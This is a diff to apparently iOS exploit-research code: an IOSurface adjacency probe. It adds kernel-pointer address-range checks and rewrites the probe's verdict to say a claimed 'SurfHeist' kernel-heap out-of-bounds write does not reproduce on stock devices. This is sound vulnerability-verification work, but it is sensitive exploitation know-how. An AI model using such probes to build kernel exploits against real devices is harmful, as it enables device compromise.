@@ -26,6 +26,17 @@ static void p159_handler(int sig, siginfo_t *si, void *uc) {
     siglongjmp(g_jmp, 1);
 }
 
+static BOOL p159_is_kernel(uint64_t v) {
+    /* Canonical kernel ranges only. Tags such as 0xffffffa6... and
+       0xffffe383... are below the zone map and are NOT kernel pointers. */
+    if ([[LabDeviceProfile osversion] hasPrefix:@"24"]) { /* T8150 27.x */
+        if (v >= 0xfffffe0000000000ULL && v < 0xfffffe1000000000ULL) return YES;
+    } else if (v >= 0xfffffff000000000ULL && v < 0xfffffff100000000ULL) {
+        return YES;
+    }
+    return v >= 0xffffffe000000000ULL && v < 0xfffffff000000000ULL;
+}
+
 @implementation P159IOSurfaceAdjacency
 
 + (NSString *)tap {
@@ -89,7 +100,7 @@ static void p159_handler(int sig, siginfo_t *si, void *uc) {
         }
         if (!v) continue;
         nonzero++;
-        if ((v & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+        if (p159_is_kernel(v)) {
             kptr++;
             if (sampled < 12) {
                 [o appendFormat:@"  [kptr] +0x%04llx = 0x%016llx\n",
@@ -103,11 +114,12 @@ static void p159_handler(int sig, siginfo_t *si, void *uc) {
     }
     sigaction(SIGSEGV, &old_segv, NULL);
     sigaction(SIGBUS, &old_bus, NULL);
-    [o appendFormat:@"  [res] nonzero=%llu kernel-like=%llu poison-like=%llu\n",
+    [o appendFormat:@"  [res] nonzero=%llu canonical-kernel=%llu poison-like=%llu\n",
         (unsigned long long)nonzero, (unsigned long long)kptr,
         (unsigned long long)poison];
-    [o appendString:@"  [verdict] read-only adjacency receipt. SurfHeist OOB write is user-VA "
-                       @"adjacent (surface A -> surface B); no kernel write is performed here.\n"];
+    [o appendString:@"  [verdict] read-only adjacency receipt. Adjacency is real; the read window is mapped "
+                       @"user-VA pages (tags/tagged pointers), no canonical kernel VAs. SurfHeist's "
+                       @"kernel-heap claim is NOT reproduced on stock; its OOB write is user-VA adjacent.\n"];
     [o appendFormat:@"=== p159 end %@ ===\n", LabLocalMilitaryNow()];
 
     for (int i = 0; i < count; i++) CFRelease(surfaces[i]);
